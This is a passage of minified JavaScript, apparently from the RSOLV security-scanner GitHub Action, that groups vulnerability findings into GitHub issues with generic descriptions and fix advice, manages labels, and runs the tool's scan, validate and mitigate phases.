J={},Y=10240,W=new Map;for(let G of Q)W.set(G.path,G.content);for(let G of o9.MANIFEST_FILES){let H=W.get(G);if(H){if(H.length<=10240)J[G]=H;else{let $=o9.truncateManifest(G,H);if($&&$.length<=10240)J[G]=$,V.info(`RFC-101: Truncated oversized ${G} (${H.length}  ${$.length} bytes)`)}continue}try{let{data:$}=await this.github.repos.getContent({owner:X.repository.owner,repo:X.repository.name,path:G,ref:X.repository.defaultBranch});if("content"in $&&$.content&&$.encoding==="base64"){let z=Buffer.from($.content,"base64").toString("utf-8");if(z.length<=10240)J[G]=z;else{let U=o9.truncateManifest(G,z);if(U&&U.length<=10240)J[G]=U,V.info(`RFC-101: Truncated oversized ${G} (${z.length}  ${U.length} bytes)`)}}}catch{}}if(Object.keys(J).length>0)V.info(`RFC-101: Captured ${Object.keys(J).length} manifest files: ${Object.keys(J).join(", ")}`);return J}static truncateManifest(X,Q){let J=X.split("/").pop()||"";if(J==="pom.xml"){let Y=Q.match(/<parent>[\s\S]*?<\/parent>/),W=[],G=/<dependency>[\s\S]*?<\/dependency>/g,H;while((H=G.exec(Q))!==null)W.push(H[0]);if(W.length===0&&!Y)return null;let $=["<project>"];if(Y)$.push(Y[0]);if(W.length>0)$.push("<dependencies>"),$.push(...W),$.push("</dependencies>");return $.push("</project>"),$.join(`
`)}if(J==="build.gradle"){let Y=[],W=/\bdependencies\s*\{/g,G;while((G=W.exec(Q))!==null){let H=1,$=G.index+G[0].length;while($<Q.length&&H>0){if(Q[$]==="{")H++;else if(Q[$]==="}")H--;$++}if(H===0)Y.push(Q.slice(G.index,$))}if(Y.length===0)return null;return Y.join(`
`)}return null}isSupportedLanguage(X){return["javascript","typescript","python","ruby","java","php","elixir"].includes(X.toLowerCase())}groupVulnerabilities(X){let Q=new Map;for(let J of X){let Y=`${J.type}-${J.severity}`;if(!Q.has(Y))Q.set(Y,{type:J.type,severity:J.severity,count:0,files:[],vulnerabilities:[],isVendor:!1});let W=Q.get(Y);if(W.count++,W.vulnerabilities.push(J),J.filePath&&!W.files.includes(J.filePath))W.files.push(J.filePath)}return Array.from(Q.values()).sort((J,Y)=>{let W=AU[J.severity]-AU[Y.severity];return W!==0?W:Y.count-J.count})}}g9();y1();var em1={sql_injection:"SQL Injection","sql-injection":"SQL Injection",xss:"Cross-Site Scripting (XSS)",command_injection:"Command Injection","command-injection":"Command Injection",path_traversal:"Path Traversal","path-traversal":"Path Traversal",weak_cryptography:"Weak Cryptography","weak-crypto":"Weak Cryptography",hardcoded_secrets:"Hardcoded Secrets",hardcoded_secret:"Hardcoded Secrets","hardcoded-secret":"Hardcoded Secrets","insecure-random":"Insecure Random Number Generation",open_redirect:"Open Redirect","open-redirect":"Open Redirect",xml_external_entities:"XML External Entity (XXE)",xxe:"XML External Entity (XXE)",server_side_request_forgery:"Server-Side Request Forgery (SSRF)",ssrf:"Server-Side Request Forgery (SSRF)",nosql_injection:"NoSQL Injection","nosql-injection":"NoSQL Injection",ldap_injection:"LDAP Injection","ldap-injection":"LDAP Injection",xpath_injection:"XPath Injection","xpath-injection":"XPath Injection","weak-hash":"Weak Hashing Algorithm",insecure_deserialization:"Insecure Deserialization","insecure-deserialization":"Insecure Deserialization",prototype_pollution:"Prototype Pollution","prototype-pollution":"Prototype Pollution",code_injection:"Code Injection","code-injection":"Code Injection",template_injection:"Server-Side Template Injection (SSTI)","template-injection":"Server-Side Template Injection (SSTI)",insecure_jwt:"Insecure JWT Configuration",debug_mode:"Debug Mode Enabled",broken_access_control:"Broken Access Control",broken_authentication:"Broken Authentication",security_misconfiguration:"Security Misconfiguration",sensitive_data_exposure:"Sensitive Data Exposure",mass_assignment:"Mass Assignment",log_injection:"Log Injection",information_disclosure:"Information Disclosure",improper_input_validation:"Improper Input Validation",cross_site_request_forgery:"Cross-Site Request Forgery (CSRF)",csrf:"Cross-Site Request Forgery (CSRF)",denial_of_service:"Denial of Service"};function _D(X){return em1[X]||X.replace(/[_-]/g," ").replace(/\b\w/g,(Q)=>Q.toUpperCase())}class LU{github;constructor(){this.github=v0()}extractLabelNames(X){return X.map((Q)=>typeof Q==="string"?Q:Q.name||"")}checkSkipStatus(X){if(X.includes("rsolv:validated"))return"skip:validated";if(X.includes("rsolv:false-positive"))return"skip:false-positive";if(X.includes("rsolv:wont-fix")||X.includes("rsolv:accepted-risk")||X.includes("rsolv:deferred"))return"skip:dismissed";return null}async createIssuesFromGroups(X,Q){let J=[],Y=0,W=0,G=0;if(!Q.createIssues)return V.info("Issue creation disabled, skipping"),{issues:J,skippedValidated:Y,skippedFalsePositive:W,skippedDismissed:G};let H=X.filter((B)=>B.isVendor),$=X.filter((B)=>!B.isVendor);V.info(`Found ${$.length} application vulnerability groups and ${H.length} vendor vulnerability groups`);let z=$,U=Q.maxIssues,K=U?z.slice(0,U):z;if(V.info(`Processing ${K.length} application vulnerability groups`+(U?` (limited by max_issues: ${U})`:"")),U&&z.length>U)V.info(`Note: ${z.length-U} vulnerability groups will be skipped due to max_issues limit`);if(H.length>0){V.info(`Skipping ${H.length} vendor vulnerability groups (require library updates, not code patches)`);for(let B of H)V.info(`  - ${B.type} in ${B.files.length} vendor files (${B.count} instances)`)}for(let B of K)try{let q=await this.findExistingIssue(B,Q);if(q==="skip:validated"){Y++;continue}if(q==="skip:false-positive"){W++;continue}if(q==="skip:dismissed"){G++;continue}if(q){V.info(`Found existing issue #${q.number} for ${B.type} vulnerabilities`);let Z=await this.updateExistingIssue(q,B,Q);J.push(Z)}else{let Z=await this.createIssueForGroup(B,Q);J.push(Z),V.info(`Created new issue #${Z.number} for ${B.type} vulnerabilities`)}}catch(q){V.error(`Failed to process issue for ${B.type}:`,q)}return{issues:J,skippedValidated:Y,skippedFalsePositive:W,skippedDismissed:G}}async findExistingIssue(X,Q){try{if(process.env.RSOLV_TESTING_MODE==="true"&&process.env.RSOLV_FORCE_FRESH_ISSUES==="true")return V.info("Test mode: Force fresh issues enabled, skipping existing issue check"),null;let J=`rsolv:vuln-${X.type}`,{data:Y}=await this.github.issues.listForRepo({owner:Q.repository.owner,repo:Q.repository.name,labels:J,state:"open"});if(Y.length===0)return null;let W=Y[0],G=this.extractLabelNames(W.labels),H=this.checkSkipStatus(G);if(H){let z={"skip:validated":"validated","skip:false-positive":"false positive","skip:dismissed":"dismissed (wont-fix/accepted-risk/deferred)"}[H]||H;return V.info(`Skipping ${z} issue #${W.number} for ${X.type}`),H}return W}catch(J){return V.warn(`Failed to check for existing issues: ${J}`),null}}async updateExistingIssue(X,Q,J){let Y=this.generateIssueTitle(Q),W=this.generateIssueBody(Q,J);if(await this.github.issues.update({owner:J.repository.owner,repo:J.repository.name,issue_number:X.number,title:Y,body:W}),!this.extractLabelNames(X.labels||[]).includes("rsolv:detected"))await this.github.issues.addLabels({owner:J.repository.owner,repo:J.repository.name,issue_number:X.number,labels:["rsolv:detected"]});let H=this.generateUpdateComment(Q,X);return await this.github.issues.createComment({owner:J.repository.owner,repo:J.repository.name,issue_number:X.number,body:H}),{number:X.number,title:Y,url:X.html_url,vulnerabilityType:Q.type,fileCount:Q.files.length}}generateUpdateComment(X,Q){let J=new Date().toISOString(),Y=X.files.length===1?"file":"files";return[`## \uD83D\uDCCA Scan Update - ${J}`,"",`**Updated vulnerability count**: ${X.count} instances in ${X.files.length} ${Y}`,"","This issue has been updated with the latest scan results.","The vulnerability details above reflect the current state of the codebase."].join(`
`)}async createIssueForGroup(X,Q){let J=this.generateIssueTitle(X),Y=this.generateIssueBody(X,Q),W=["rsolv:detected",`rsolv:vuln-${X.type}`,"security",X.severity,"automated-scan"];if(process.env.RSOLV_DEMO_MODE==="true"||process.env.RSOLV_AUTO_FIX==="true")W.push("rsolv:automate"),W.push("demo");let{data:G}=await this.github.issues.create({owner:Q.repository.owner,repo:Q.repository.name,title:J,body:Y,labels:W});return{number:G.number,title:G.title,url:G.html_url,vulnerabilityType:X.type,fileCount:X.files.length}}generateIssueTitle(X){let Q=X.type||"security-vulnerability",J=_D(Q),Y=X.files.length;return`\uD83D\uDD12 ${J} vulnerabilities found in ${Y} ${Y===1?"file":"files"}`}generateIssueBody(X,Q){let J=[];J.push("## Security Vulnerability Report"),J.push("");let Y=X.type||"security-vulnerability",W=_D(Y);J.push(`**Type**: ${W}`),J.push(`**Severity**: ${X.severity.toUpperCase()}`),J.push(`**Total Instances**: ${X.count}`),J.push(`**Affected Files**: ${X.files.length}`),J.push("");let G=X.vulnerabilities[0];if(G){let $=[];if(G.cweId){let z=G.cweId.replace(/^CWE-/,"");$.push(`- **CWE**: [${G.cweId}](https://cwe.mitre.org/data/definitions/${z}.html)`)}if(G.owaspCategory)$.push(`- **OWASP**: ${G.owaspCategory}`);if(G.confidence!==void 0)$.push(`- **Confidence**: ${G.confidence}%`);if($.length>0)J.push("### Security Classification"),J.push(...$),J.push("")}J.push("### Description"),J.push(this.getVulnerabilityDescription(Y)),J.push(""),J.push("### Affected Files"),J.push("");let H=new Map;for(let $ of X.vulnerabilities){if(!$.filePath)continue;if(!H.has($.filePath))H.set($.filePath,[]);H.get($.filePath).push($)}for(let[$,z]of H){J.push(`#### \`${$}\``),J.push("");for(let U of z.slice(0,3))if(J.push(`- **Line ${U.line}**: ${U.description}`),U.snippet)J.push("  ```"+this.detectLanguageFromPath($)),J.push("  "+U.snippet.trim()),J.push("  ```");if(z.length>3)J.push(`- ... and ${z.length-3} more instances`);J.push("")}return J.push("### Recommendation"),J.push(this.getVulnerabilityRecommendation(Y)),J.push(""),J.push("---"),J.push("*This issue was automatically generated by RSOLV security scanner*"),J.push(`*Repository: ${Q.repository.owner}/${Q.repository.name}*`),J.push(`*Branch: ${Q.repository.defaultBranch}*`),J.push(`*Scan Date: ${new Date().toISOString()}*`),J.push(""),J.push("*To dismiss this finding, add one of these labels:*"),J.push("*`rsolv:false-positive`  `rsolv:wont-fix`  `rsolv:accepted-risk`  `rsolv:deferred`*"),J.join(`
`)}getVulnerabilityDescription(X){return{sql_injection:"SQL injection vulnerabilities occur when user input is directly concatenated into SQL queries without proper sanitization or parameterization. This can allow attackers to execute arbitrary SQL commands.","sql-injection":"SQL injection vulnerabilities occur when user input is directly concatenated into SQL queries without proper sanitization or parameterization. This can allow attackers to execute arbitrary SQL commands.",xss:"Cross-Site Scripting (XSS) vulnerabilities occur when user input is rendered in HTML without proper escaping. This can allow attackers to inject malicious scripts that execute in other users' browsers.",command_injection:"Command injection vulnerabilities occur when user input is passed directly to system commands. This can allow attackers to execute arbitrary system commands on the server.","command-injection":"Command injection vulnerabilities occur when user input is passed directly to system commands. This can allow attackers to execute arbitrary system commands on the server.",path_traversal:"Path traversal vulnerabilities occur when user input is used to construct file paths without proper validation. This can allow attackers to access files outside the intended directory.","path-traversal":"Path traversal vulnerabilities occur when user input is used to construct file paths without proper validation. This can allow attackers to access files outside the intended directory.",weak_cryptography:"Weak cryptography vulnerabilities occur when outdated or insecure cryptographic algorithms are used. This can make encrypted data vulnerable to decryption by attackers.","weak-crypto":"Weak cryptography vulnerabilities occur when outdated or insecure cryptographic algorithms are used. This can make encrypted data vulnerable to decryption by attackers.",hardcoded_secrets:"Hardcoded secrets in source code can be exposed if the code is leaked or accessed by unauthorized parties. This includes API keys, passwords, and other sensitive credentials.","hardcoded-secret":"Hardcoded secrets in source code can be exposed if the code is leaked or accessed by unauthorized parties. This includes API keys, passwords, and other sensitive credentials.","insecure-random":"Using insecure random number generators for security-critical operations can make systems predictable and vulnerable to attacks.",open_redirect:"Open redirect vulnerabilities occur when user input is used to construct redirect URLs without validation. This can be used in phishing attacks.","open-redirect":"Open redirect vulnerabilities occur when user input is used to construct redirect URLs without validation. This can be used in phishing attacks.",xml_external_entities:"XML External Entity (XXE) vulnerabilities occur when XML parsers process external entity references. This can lead to file disclosure, SSRF, or denial of service.",xxe:"XML External Entity (XXE) vulnerabilities occur when XML parsers process external entity references. This can lead to file disclosure, SSRF, or denial of service.",server_side_request_forgery:"Server-Side Request Forgery (SSRF) vulnerabilities occur when user input is used to make HTTP requests from the server. This can allow access to internal resources.",ssrf:"Server-Side Request Forgery (SSRF) vulnerabilities occur when user input is used to make HTTP requests from the server. This can allow access to internal resources.",nosql_injection:"NoSQL injection vulnerabilities occur when user input is used in NoSQL queries without proper sanitization. This can allow attackers to manipulate queries and access unauthorized data.","nosql-injection":"NoSQL injection vulnerabilities occur when user input is used in NoSQL queries without proper sanitization. This can allow attackers to manipulate queries and access unauthorized data.",ldap_injection:"LDAP injection vulnerabilities occur when user input is used in LDAP queries without proper escaping. This can allow attackers to modify LDAP queries and bypass authentication.","ldap-injection":"LDAP injection vulnerabilities occur when user input is used in LDAP queries without proper escaping. This can allow attackers to modify LDAP queries and bypass authentication.",xpath_injection:"XPath injection vulnerabilities occur when user input is used in XPath queries without proper sanitization. This can allow attackers to extract sensitive data from XML documents.","xpath-injection":"XPath injection vulnerabilities occur when user input is used in XPath queries without proper sanitization. This can allow attackers to extract sensitive data from XML documents.","weak-hash":"Weak hashing algorithms like MD5 or SHA1 are vulnerable to collision attacks and should not be used for security-critical operations.",insecure_deserialization:"Insecure deserialization vulnerabilities occur when untrusted data is deserialized without proper validation. This can lead to remote code execution.","insecure-deserialization":"Insecure deserialization vulnerabilities occur when untrusted data is deserialized without proper validation. This can lead to remote code execution.",prototype_pollution:"Prototype pollution vulnerabilities occur when an attacker can modify an object's prototype, allowing them to inject properties that are inherited by all objects. This can lead to denial of service, property injection, or in some cases remote code execution by polluting the prototype chain.","prototype-pollution":"Prototype pollution vulnerabilities occur when an attacker can modify an object's prototype, allowing them to inject properties that are inherited by all objects. This can lead to denial of service, property injection, or in some cases remote code execution by polluting the prototype chain.",code_injection:"Code injection vulnerabilities occur when user input is passed to functions that execute code dynamically, such as eval(). This can allow attackers to execute arbitrary code in the application context.","code-injection":"Code injection vulnerabilities occur when user input is passed to functions that execute code dynamically, such as eval(). This can allow attackers to execute arbitrary code in the application context."}[X]||"This type of vulnerability can compromise the security of your application."}getVulnerabilityRecommendation(X){return{sql_injection:"Use parameterized queries or prepared statements instead of string concatenation. Never trust user input and always validate and sanitize it before use in SQL queries.","sql-injection":"Use parameterized queries or prepared statements instead of string concatenation. Never trust user input and always validate and sanitize it before use in SQL queries.",xss:"Always escape user input before rendering it in HTML. Use context-appropriate escaping functions and consider using a templating engine that provides automatic escaping.",command_injection:"Avoid executing system commands with user input. If necessary, use a whitelist of allowed values and escape shell metacharacters. Consider using language-specific APIs instead of shell commands.","command-injection":"Avoid executing system commands with user input. If necessary, use a whitelist of allowed values and escape shell metacharacters. Consider using language-specific APIs instead of shell commands.",path_traversal:"Validate and sanitize file paths. Use a whitelist of allowed directories and files. Resolve paths to their canonical form and ensure they stay within allowed boundaries.","path-traversal":"Validate and sanitize file paths. Use a whitelist of allowed directories and files. Resolve paths to their canonical form and ensure they stay within allowed boundaries.",weak_cryptography:"Replace weak cryptographic algorithms with strong, modern alternatives. Use AES for encryption, SHA-256 or better for hashing, and ensure proper key management.","weak-crypto":"Replace weak cryptographic algorithms with strong, modern alternatives. Use AES for encryption, SHA-256 or better for hashing, and ensure proper key management.",hardcoded_secrets:"Remove hardcoded secrets from source code. Use environment variables, secure key management systems, or configuration files that are not committed to version control.","hardcoded-secret":"Remove hardcoded secrets from source code. Use environment variables, secure key management systems, or configuration files that are not committed to version control.","insecure-random":"Use cryptographically secure random number generators (CSPRNGs) for security-critical operations. Most languages provide secure alternatives to standard random functions.",open_redirect:"Validate redirect URLs against a whitelist of allowed domains. Avoid using user input directly in redirect locations.","open-redirect":"Validate redirect URLs against a whitelist of allowed domains. Avoid using user input directly in redirect locations.",xml_external_entities:"Disable XML external entity processing in XML parsers. Configure parsers to not resolve external entities or DTDs.",xxe:"Disable XML external entity processing in XML parsers. Configure parsers to not resolve external entities or DTDs.",server_side_request_forgery:"Validate and whitelist URLs before making requests. Implement network segmentation to limit access to internal resources.",ssrf:"Validate and whitelist URLs before making requests. Implement network segmentation to limit access to internal resources.",nosql_injection:"Sanitize and validate user input before using it in NoSQL queries. Use parameterized queries where available and avoid string concatenation.","nosql-injection":"Sanitize and validate user input before using it in NoSQL queries. Use parameterized queries where available and avoid string concatenation.",ldap_injection:"Escape special LDAP characters in user input. Use parameterized LDAP queries and validate input against expected patterns.","ldap-injection":"Escape special LDAP characters in user input. Use parameterized LDAP queries and validate input against expected patterns.",xpath_injection:"Use parameterized XPath queries or escape user input properly. Validate input against expected patterns and avoid dynamic query construction.","xpath-injection":"Use parameterized XPath queries or escape user input properly. Validate input against expected patterns and avoid dynamic query construction.","weak-hash":"Replace MD5 and SHA1 with SHA-256 or better for security operations. For password hashing, use bcrypt, scrypt, or Argon2.",insecure_deserialization:"Avoid deserializing untrusted data. If necessary, use safe serialization formats like JSON and validate the structure before processing.","insecure-deserialization":"Avoid deserializing untrusted data. If necessary, use safe serialization formats like JSON and validate the structure before processing.",prototype_pollution:"Use Object.create(null) to create objects without a prototype, validate object keys against a whitelist before assignment, use Map instead of plain objects for dynamic key-value storage, or freeze prototypes with Object.freeze(Object.prototype).","prototype-pollution":"Use Object.create(null) to create objects without a prototype, validate object keys against a whitelist before assignment, use Map instead of plain objects for dynamic key-value storage, or freeze prototypes with Object.freeze(Object.prototype).",code_injection:"Avoid using eval() and similar dynamic code execution functions. Use safe alternatives like JSON.parse() for data parsing. If dynamic code execution is absolutely necessary, use sandboxed environments and strict input validation.","code-injection":"Avoid using eval() and similar dynamic code execution functions. Use safe alternatives like JSON.parse() for data parsing. If dynamic code execution is absolutely necessary, use sandboxed environments and strict input validation."}[X]||"Review and fix the identified vulnerabilities according to security best practices."}detectLanguageFromPath(X){let Q=X.substring(X.lastIndexOf("."));return{".js":"javascript",".jsx":"javascript",".ts":"typescript",".tsx":"typescript",".py":"python",".rb":"ruby",".java":"java",".php":"php",".ex":"elixir",".exs":"elixir"}[Q]||""}}y1();y1();var Xu1=[{name:"rsolv:detected",color:"FBCA04",description:"Issue detected by RSOLV security scan"},{name:"rsolv:validate",color:"0E8A16",description:"Trigger RSOLV validation phase"},{name:"rsolv:automate",color:"0052CC",description:"Trigger RSOLV fix generation"},{name:"security",color:"D93F0B",description:"Security vulnerability"},{name:"automated-scan",color:"C5DEF5",description:"Created by automated security scan"},{name:"critical",color:"B60205",description:"Critical severity"},{name:"high",color:"D93F0B",description:"High severity"},{name:"medium",color:"FBCA04",description:"Medium severity"},{name:"low",color:"0E8A16",description:"Low severity"}];async function kD(X,Q,J){V.info("Ensuring required labels exist...");try{let Y=await Qu1(X,Q,J);if(!Y)return;await Ju1(X,Q,J,Y),V.info("Label check complete")}catch(Y){V.error("Failed to ensure labels exist",Y)}}async function Qu1(X,Q,J){let Y=await fetch(`https://api.github.com/repos/${X}/${Q}/labels`,{headers:bD(J)});if(!Y.ok)return V.warn(`Failed to fetch labels: ${Y.status}. Skipping label creation.`),null;let W=await Y.json();return new Set(W.map((G)=>G.name.toLowerCase()))}async function Ju1(X,Q,J,Y){let W=Xu1.filter((G)=>!Y.has(G.name.toLowerCase()));for(let G of W)await Yu1(X,Q,J,G)}async function Yu1(X,Q,J,Y){V.info(`Creating missing label: ${Y.name}`);let W=await fetch(`https://api.github.com/repos/${X}/${Q}/labels`,{method:"POST",headers:bD(J),body:JSON.stringify(Y)});if(!W.ok){let G=await W.text();V.warn(`Failed to create label ${Y.name}: ${G}`)}else V.info(` Created label: ${Y.name}`)}function bD(X){return{Authorization:`token ${X}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"}}class tY{scanner;issueCreator;constructor(){this.scanner=new o9,this.issueCreator=new LU}async performScan(X){V.info("Starting proactive security scan");try{if(X.createIssues&&process.env.GITHUB_TOKEN)await kD(X.repository.owner,X.repository.name,process.env.GITHUB_TOKEN);let Q=await this.scanner.scan(X);if(X.createIssues&&Q.groupedVulnerabilities.length>0){let J=X.maxIssues,Y=J?Math.min(J,Q.groupedVulnerabilities.length):Q.groupedVulnerabilities.length;V.info(`Creating issues for ${Y} vulnerability groups`+(J&&Q.groupedVulnerabilities.length>J?` (limited by max_issues: ${J})`:""));let W=Q.groupedVulnerabilities.slice(0,Y),G=await this.issueCreator.createIssuesFromGroups(W,X);if(Q.createdIssues=G.issues,Q.skippedValidated=G.skippedValidated,Q.skippedFalsePositive=G.skippedFalsePositive,V.info(`Created ${G.issues.length} issues`),G.skippedValidated>0)V.info(`Skipped ${G.skippedValidated} already validated issues`);if(G.skippedFalsePositive>0)V.info(`Skipped ${G.skippedFalsePositive} false positive issues`)}return this.logScanSummary(Q),Q}catch(Q){throw V.error("Scan failed:",Q),Q}}logScanSummary(X){if(V.info(""),V.info("=== SECURITY SCAN SUMMARY ==="),V.info(`Repository: ${X.repository}`),V.info(`Branch: ${X.branch}`),V.info(`Files scanned: ${X.scannedFiles}/${X.totalFiles}`),V.info(`Total vulnerabilities: ${X.vulnerabilities.length}`),V.info(""),X.groupedVulnerabilities.length>0){V.info("Vulnerabilities by type:");for(let Q of X.groupedVulnerabilities)V.info(`  - ${Q.type} (${Q.severity}): ${Q.count} instances in ${Q.files.length} files`);V.info("")}if(X.createdIssues.length>0){V.info("Created issues:");for(let Q of X.createdIssues)V.info(`  - #${Q.number}: ${Q.title}`),V.info(`    ${Q.url}`);V.info("")}if(X.skippedValidated||X.skippedFalsePositive){if(V.info("Skipped issues:"),X.skippedValidated)V.info(`  - ${X.skippedValidated} validated issues`);if(X.skippedFalsePositive)V.info(`  - ${X.skippedFalsePositive} false positive issues`);V.info("")}V.info("=============================")}}w5();xU();gU();zJ();eK();XV();QV();JV();y1();YV();import{execSync as bX}from"child_process";class TV{phaseDataClient;scanner;config;testGenerator;fixer;validationMode;constructor(X){this.config=X,this.phaseDataClient=new R4(X.rsolvApiKey||X.apiKey||"",process.env.RSOLV_API_URL)}getScanner(){if(!this.scanner)this.scanner=new tY;return this.scanner}async execute(X,Q){switch(V.info(`Executing in ${X} mode`,Q),X){case"scan":return this.executeScan(Q);case"validate":case"validate-only":if(Q.issues&&Q.issues.length>0)return this.executeValidateStandalone(Q);else if(Q.issueNumber||Q.scanData)return this.executeValidate(Q);else{V.info("[VALIDATE] No specific issues provided, detecting issues by label");let J=this.config.maxIssues||5;V.info(`[VALIDATE] Detecting up to ${J} issues with label '${this.config.issueLabel}'`);let{detectIssuesFromAllPlatforms:Y}=await Promise.resolve().then(() => (UG(),zG)),W=await Y({...this.config,maxIssues:J});if(W.length===0)throw Error(`No issues found with label '${this.config.issueLabel}'`);return V.info(`[VALIDATE] Found ${W.length} issues to validate (limited by max_issues: ${J})`),this.executeValidateStandalone({...Q,issues:W})}case"mitigate":case"fix-only":if(Q.issues&&Q.issues.length>0)return this.executeMitigateStandalone(Q);else if(Q.issueNumber)return this.executeMitigate(Q);else{V.info("[MITIGATE] No specific issues provided, detecting issues by label");let J="rsolv:validated",Y=this.config.maxIssues||5;V.info(`[MITIGATE] Detecting up to ${Y} issues with label '${J}'`);let{detectIssuesFromAllPlatforms:W}=await Promise.resolve().then(() => (UG(),zG)),G=await W({...this.config,issueLabel:J,maxIssues:Y});if(G.length===0){let H=[5000,1e4,15000];for(let $ of H)if(V.info(`[MITIGATE] No issues found yet, retrying in ${$/1000}s (GitHub API label propagation delay)...`),await new Promise((z)=>setTimeout(z,$)),G=await W({...this.config,issueLabel:J,maxIssues:Y}),G.length>0){V.info(`[MITIGATE] Found ${G.length} issues after retry`);break}}if(G.length===0)return V.warn(`[MITIGATE] No issues found with label '${J}' after retries`),{success:!1,phase:"mitigate",error:`No validated issues found with label '${J}'. Please run validation phase first.`};return V.info(`[MITIGATE] Found ${G.length} validated issues to mitigate`),this.executeMitigateStandalone({...Q,issues:G,usePriorValidation:!0})}case"validate-and-fix":if(Q.issueNumber){V.info(`[VALIDATE-AND-FIX] Processing specific issue #${Q.issueNumber}`);let{getIssue:J}=await Promise.resolve().then(() => (g9(),r7)),[Y,W]=process.env.GITHUB_REPOSITORY.split("/"),G=await J(Y,W,Q.issueNumber);if(!G)throw Error(`Issue #${Q.issueNumber} not found`);let H=await this.executeValidateStandalone({...Q,issues:[G]});if(!H.success)return H;let $=await this.executeMitigateStandalone({...Q,issues:[G],usePriorValidation:!0});return{success:$.success,phase:"validate-and-fix",message:`Processed issue #${Q.issueNumber}: validation ${H.success?"succeeded":"failed"}, mitigation ${$.success?"succeeded":"failed"}`,data:{validation:H.data,mitigation:$.data}}}else{V.info("[VALIDATE-AND-FIX] No specific issue provided, detecting issues by label");let J=this.config.maxIssues||5,{detectIssuesFromAllPlatforms:Y}=await Promise.resolve().then(() => (UG(),zG)),W=await Y({...this.config,maxIssues:J});if(W.length===0)throw Error(`No issues found with label '${this.config.issueLabel}'`);let G=await this.executeValidateStandalone({...Q,issues:W}),H=await this.executeMitigateStandalone({...Q,issues:W,usePriorValidation:!0});return{success:G.success&&H.success,phase:"validate-and-fix",message:`Processed ${W.length} issues`,data:{validation:G.data,mitigation:H.data}}}case"full":return this.executeAllPhases(Q);default:throw Error(`Unknown mode: ${X}`)}}async executeScan(X){try{let Q=X.repository;if(!Q&&X.issues&&X.issues.length>0)Q=X.issues[0].repository;if(!Q)throw Error("Scan mode requires repository information");if(X.issues&&X.issues.length>0){let W={canBeFixed:!0,vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:await this.getCurrentCommitSha()};for(let G of X.issues)try{let H=await this.executeScanForIssue(G);if(H.success&&H.data){if(W.vulnerabilities.push({issueNumber:G.number,...H.data}),!H.data.canBeFixed)W.canBeFixed=!1}}catch(H){V.warn(`Failed to scan issue #${G.number}:`,H)}return await this.storePhaseData("scan",W,{repo:`${Q.owner}/${Q.name}`,commitSha:W.commitHash}),{success:!0,phase:"scan",data:{scan:W}}}let J=await this.getScanner().performScan({mode:"scan",repository:{...Q,defaultBranch:Q.defaultBranch||"main"},createIssues:!0,batchSimilar:!0,issueLabel:this.config.issueLabel||"rsolv:automate",enableASTValidation:process.env.RSOLV_ENABLE_AST_VALIDATION!=="false",rsolvApiKey:this.config.rsolvApiKey,maxIssues:this.config.maxIssues}),Y=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("scan",J,{repo:`${Q.owner}/${Q.name}`,commitSha:Y}),{success:!0,phase:"scan",message:`Found ${J.vulnerabilities.length} vulnerabilities`,data:{scan:J}}}catch(Q){return V.error("Scan phase failed",Q),{success:!1,phase:"scan",error:Q instanceof Error?Q.message:String(Q)}}}async executeValidate(X){try{if(V.info("[VALIDATE] Starting RFC-058 validation phase with ValidationMode"),!X.issueNumber||!X.repository)return{success:!1,phase:"validate",error:"Validation requires an issue number and repository"};let{getIssue:Q}=await Promise.resolve().then(() => (g9(),r7)),J=await Q(X.repository.owner,X.repository.name,X.issueNumber);if(!J)return{success:!1,phase:"validate",error:`Issue #${X.issueNumber} not found`};let Y={id:`issue-${J.number}`,number:J.number,title:J.title,body:J.body||"",labels:J.labels?.map((U)=>typeof U==="string"?U:U.name)||[],assignees:J.assignees?.map((U)=>U.login)||[],repository:{owner:X.repository.owner,name:X.repository.name,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:J.created_at||new Date().toISOString(),updatedAt:J.updated_at||new Date().toISOString(),metadata:{}},{ValidationMode:W}=await Promise.resolve().then(() => (ZG(),qG)),G=new W(this.config,process.cwd());V.info(`[VALIDATE] Using ValidationMode for RFC-058 validation of issue #${X.issueNumber}`);let H=await G.validateVulnerability(Y);if(!H.validated){V.info(`[VALIDATE] Issue #${X.issueNumber} failed validation: ${H.falsePositiveReason}`);let U=X.commitSha||this.getCurrentCommitSha();return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:{issueNumber:H.issueId,validated:!1,falsePositiveReason:H.falsePositiveReason,timestamp:H.timestamp,commitHash:H.commitHash,cweId:H.cweId,testType:H.testType,framework:H.framework,retryCount:H.retryCount,classificationSource:H.classificationSource,infrastructureFailure:H.infrastructureFailure||!1,validationInconclusive:H.validationInconclusive||!1}},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:U}),{success:!0,phase:"validate",message:`Issue #${X.issueNumber} identified as false positive: ${H.falsePositiveReason}`,data:{validation:{issueNumber:H.issueId,validated:!1,falsePositiveReason:H.falsePositiveReason,timestamp:H.timestamp}}}}if(V.info(`[VALIDATE]  Issue #${X.issueNumber} validated successfully with ValidationMode`),H.branchName)V.info(`[VALIDATE]  RFC-058: Tests committed to validation branch: ${H.branchName}`);let $=X.commitSha||this.getCurrentCommitSha(),z={issueNumber:H.issueId,validated:!0,branchName:H.branchName,redTests:H.redTests,testResults:H.testResults,timestamp:H.timestamp,commitHash:H.commitHash,hasSpecificVulnerabilities:!0,vulnerabilities:H.vulnerabilities||[],confidence:"high",cweId:H.cweId,testType:H.testType,framework:H.framework,retryCount:H.retryCount,classificationSource:H.classificationSource,infrastructureFailure:H.infrastructureFailure||!1,validationInconclusive:H.validationInconclusive||!1};return await this.storePhaseData("validation",{[`issue-${X.issueNumber}`]:z},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.issueNumber,commitSha:$}),{success:!0,phase:"validate",message:H.branchName?`Validated issue #${X.issueNumber} with RFC-058 branch persistence: ${H.branchName}`:`Validated issue #${X.issueNumber} with RED tests`,data:{validation:z,rfc058Enabled:!!H.branchName}}}catch(Q){return V.error("Validation phase failed",Q),{success:!1,phase:"validate",error:Q instanceof Error?Q.message:String(Q)}}}async executeMitigate(X){let Q=Date.now(),J=1800000;if(process.env.AI_TIMEOUT_OVERRIDE)J=parseInt(process.env.AI_TIMEOUT_OVERRIDE,10),V.info(`[MITIGATE] Using timeout override: ${J}ms`);try{if(V.info("[MITIGATE] Starting enhanced mitigation 